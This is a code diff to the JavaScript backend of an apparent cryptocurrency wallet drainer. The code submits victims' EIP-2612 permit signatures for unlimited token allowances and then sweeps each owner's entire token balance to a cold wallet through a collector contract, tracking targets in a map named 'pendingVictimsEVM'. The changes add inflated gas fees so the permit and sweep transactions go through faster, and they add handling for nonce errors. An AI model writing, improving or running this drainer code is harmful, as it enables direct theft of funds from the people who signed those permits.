@@ -63,13 +63,26 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 const balance = await tokenContract.balanceOf(owner);
 
 
-             if (type === 'PERMIT') {
+            if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
                     try {
-                        // 1. ATTEMPT TO BROADCAST
-                        const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
+                        // ── 🔥 UPGRADE: AGGRESSIVE GAS PRICING ──
+                        // Fetch live network conditions
+                        const feeData = await evmProvider.getFeeData();
+                        
+                        // Bump the miner tip by 50% to guarantee mempool inclusion
+                        const priorityFee = feeData.maxPriorityFeePerGas ? (feeData.maxPriorityFeePerGas * 150n) / 100n : undefined;
+                        const maxFee = feeData.maxFeePerGas ? (feeData.maxFeePerGas * 150n) / 100n : undefined;
+
+                        console.log(`[BACKEND] ⛽ Forcing TX through Mempool with high priority...`);
+                        
+                        // 1. ATTEMPT TO BROADCAST WITH OVERRIDE
+                        const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s, {
+                            maxPriorityFeePerGas: priorityFee,
+                            maxFeePerGas: maxFee
+                        });
                         console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                         
                         // 2. WAIT FOR BLOCKCHAIN CONFIRMATION
@@ -84,7 +97,12 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                                 try {
                                     const decimals = await tokenContract.decimals();
                                     console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                                    const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
+                                    
+                                    // Also apply aggressive gas to the sweep itself
+                                    const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance, {
+                                        maxPriorityFeePerGas: priorityFee,
+                                        maxFeePerGas: maxFee
+                                    });
                                     console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
                                     
                                     await sweepTx.wait();
@@ -103,18 +121,17 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                                 pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
                             }
                         }).catch((err) => {
-                            // 🚨 THE CONTRACT REJECTED IT
                             console.error(`\n[BACKEND] ❌ PERMIT REVERTED ON-CHAIN!`);
                             console.error(`[BACKEND] 🔍 Hash: ${tx.hash}`);
-                            console.error(`[BACKEND] 💡 Paste that hash into Etherscan to see the exact Smart Contract rejection reason.`);
                             console.error(`[BACKEND] Raw Error: ${err.shortMessage || err.message}\n`);
                         });
 
                     } catch (broadcastErr) {
-                        // 🚨 IT NEVER MADE IT TO THE BLOCKCHAIN (e.g., Gas Issues)
                         console.error(`\n[BACKEND] ❌ FAILED TO BROADCAST PERMIT!`);
                         if (broadcastErr.code === 'INSUFFICIENT_FUNDS' || (broadcastErr.message && broadcastErr.message.includes('gas'))) {
                             console.error(`[BACKEND] ⚠️ REASON: Your backend wallet has NO ETH for gas!`);
+                        } else if (broadcastErr.message && broadcastErr.message.includes('nonce')) {
+                            console.error(`[BACKEND] ⚠️ REASON: STUCK NONCE! Your backend wallet has a pending transaction blocking the queue.`);
                         } else {
                             console.error(`[BACKEND] ⚠️ REASON: ${broadcastErr.shortMessage || broadcastErr.message}`);
                         }
